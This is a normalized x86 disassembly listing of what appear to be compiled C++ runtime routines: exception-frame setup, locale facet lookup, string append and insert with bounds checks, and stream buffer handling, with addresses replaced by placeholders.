mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x10 ] ecx
mov [ ebx + 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov edi r--data
cmp [ ebp + 0xc ] cl
jne r-xdata
call sub_419719
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edi [ eax + 0x8 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ eax + 0x1 ]
push esi
call sub_4195a1
add esp 0x4
mov ecx eax
mov [ ebx + 0x8 ] eax
call sub_419719
mov edi 0x6
push edi
mov esi r--data
call sub_4195a1
add esp 0x4
mov ecx eax
mov dl [ edi ]
mov [ ecx ] dl
dec esi
inc ecx
inc edi
jmp r-xdata
mov [ ebx + 0x10 ] eax
call sub_419719
mov edi 0x5
push edi
mov esi r--data
call sub_4195a1
add esp 0x4
mov ecx eax
jmp r-xdata
mov dl [ esi ]
mov [ ecx ] dl
dec edi
inc ecx
inc esi
jmp r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ ebx + 0x14 ] eax
call sub_419719
mov esi [ ebp - 0x14 ]
mov eax [ esi ]
mov cl [ eax ]
mov [ ebx + 0xc ] cl
call sub_419719
cmp [ ebp + 0xc ] 0x0
mov edx [ esi + 0x4 ]
mov al [ edx ]
mov [ ebx + 0xd ] al
je r-xdata
mov dl [ esi ]
mov [ ecx ] dl
dec edi
inc ecx
inc esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_419719
mov [ ebx + 0xc ] 0x2e
call sub_419719
mov [ ebx + 0xd ] 0x2c
sub_40b320
push ebp
mov ebp esp
push 0xffffffff
push sub_42d974
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_419789
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_4199a5
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_419f97
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_41ac98
sub_40b3d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d9c4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_419932
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4197b1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_41a7eb
add esp 0x4
sub_40b480
push ebp
mov ebp esp
push 0xffffffff
push sub_42d9eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_41ac18
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_40b3d0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_40b320
lea ecx [ ebp - 0x20 ]
push ecx
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_4196b9
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] eax
jmp r-xdata
sub_40b560
push ebp
mov ebp esp
push 0xffffffff
push sub_42da1b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x60 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x60 ] r--data
lea esi [ ecx - 0x48 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_40a150
mov ecx esi
call sub_40a690
mov eax [ esi - 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + esi - 0x18 ] r--data
mov edx [ esi - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
mov ecx [ esi - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + esi - 0x18 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_40b5f0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_406b70
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_41a0f0
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
sub_40b7a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0xc ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_419533
test ecx ecx
je r-xdata
push r--data
call sub_4194e6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_406c50
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0xc ]
add ecx ebx
push ecx
push eax
call sub_41a460
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add esp 0xc
push eax
push ecx
push ebx
mov ecx esi
call sub_40a1d0
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_40b8a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
mov dl [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
mov eax [ ecx ]
mov eax [ eax + 0xc ]
movzx edx dl
push edx
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
inc edi
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x1 ]
mov [ eax ] esi
mov [ ecx ] dl
movzx eax dl
jmp r-xdata
mov ecx [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
sub_40b910
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x1c ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
pop ebp
retn
push ebx
mov bl [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
pop ebx
mov eax [ ecx ]
mov eax [ eax + 0xc ]
movzx edx bl
push edx
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec esi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov [ ecx ] bl
movzx eax bl
jmp r-xdata
mov ecx [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
sub_40b980
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40b9a0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40b9c0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_4194e6
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_406c50
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi eax
cmp edi edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_407190
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_407190
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
push edx
mov edx [ esi + 0x10 ]
add edx eax
push edx
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_40bae0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_4194e6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_406c50
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_40a1d0
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40bb90
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
nop
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x20 ]
test cl cl
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push esi
push edi
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
push eax
call sub_40b8a0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] edx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov edx [ eax ]
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push ecx
call sub_40b910
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_41aec0
add esp 0xc
test eax eax
je r-xdata
sub_40bc30
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40bc50
push ebp
mov ebp esp
push 0xffffffff
push sub_42da48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_419789
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_419789
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4197b1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_419854
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4197b1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_40b480
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_419789
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_419ffe
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_41ac98
lea ecx [ ebp + 0x8 ]
call sub_4197b1
push esi
call sub_4197dd
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40bd90
push ebp
mov ebp esp
push 0xffffffff
push sub_42da7b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_41ac18
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_40b3d0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_40b320
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_419719
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_40be70
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_41ace4
mov ecx [ esi + 0x10 ]
push ecx
call sub_41ace4
mov edx [ esi + 0x14 ]
push edx
call sub_41ace4
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40bee0
push esi
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_40a3c0
or eax 0x4
sub_40bf30
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x60 ]
lea esi [ edi + 0x60 ]
mov ecx esi
call sub_40b560
push esi
mov [ esi ] r--data
call sub_419c87
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call sub_41a0d6
add esp 0x4
sub_40bf70
push ebp
mov ebp esp
push 0xffffffff
push sub_42daa0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
test [ edx + ecx + 0x14 ] 0x2
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40bee0
sub_40bfd0
push ebp
mov ebp esp
sub esp 0xc
push 0xc
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_41ac98
int3
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] ecx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
mov [ ecx ] edx
sub_40c030
push ebp
mov ebp esp
push 0xffffffff
push sub_42dac8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40a090
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40bc50
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x18 ]
push eax
mov ecx ebx
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_419789
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_4197b1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_40c0e0
push ebp
mov ebp esp
push 0xffffffff
push sub_42da48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_419789
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_419789
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4197b1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_419854
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4197b1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_40bd90
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_419789
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
